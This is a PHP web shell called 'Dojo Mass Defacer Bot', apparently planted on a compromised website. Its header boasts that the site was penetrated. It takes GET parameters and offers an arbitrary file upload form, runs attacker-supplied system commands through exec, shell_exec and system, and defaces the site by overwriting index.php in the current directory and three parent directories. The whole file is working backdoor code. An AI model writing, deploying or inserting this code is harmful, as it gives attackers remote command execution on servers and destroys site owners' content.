<?php
/*
* Dojo Mass Defacer Bot
* Backdoor now is successfully installed inside
* Your website.
* You need to learn how to secure it, before learning
* How to setup it !
* Successfully penetrated by : CryptoRhythm
*/
if(isset($_GET['cmd'])) {
  $cmd = $_GET['cmd'];
  switch($cmd) {
    case "upload":
      ?>
      <form enctype="multipart/form-data" action="" method="POST">
        <input name="uploadedfile" type="file"/>
        <input type="submit" value="Fire the laser !"/>
      </form>
       <?php
       $target_path= basename($_FILES['uploadedfile']['name']);
       if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'],$target_path)){
         echo "It's there now, bastard !";
       }
        else{echo "Are you kidding me ?";
       }
       break;
    case "sys":
      $command = $_GET['e'];
      if(isset($_GET['w'])) {
        $way = $_GET['w'];
      } else {
        $way = "1";
      }
      switch($way) {
        default:
          print "<br />-- USING EXEC() --<br />";
          exec($command);
          break;
        case "1":
          print "<br />-- USING EXEC() --<br />";
          exec($command);
          break;
        case "2":
          print "<br />-- USING SYS() --<br />";
          sys($command);
          break;
        case "3":
          print "<br />-- USING SHELL_EXEC() --<br />";
          shell_exec($command);
          break;
        case "4":
          print "<br />-- USING SYSTEM() --<br />";
          system($command);
          break;
      }
      break;
    case "deface":
      if(isset($_GET['def_page'])) {
        $deface_page = $_GET['def_page'];
      } else {
        $deface_page = "Defaced by CryptoRhythm !";
      }
      $i = 0;
      $string = "";
      $defacep = "index.php";
      $file = fopen("deface.php", "w");
      fwrite($file, $deface_page);
      fclose($file);
      while($i < 4) {
        copy("deface.php", $string.$defacep);
        $string = $string."../";
        $i++;
      }
      break;
  }
} else {
  print "DOJO::PENDING";
  exit();
}
?>
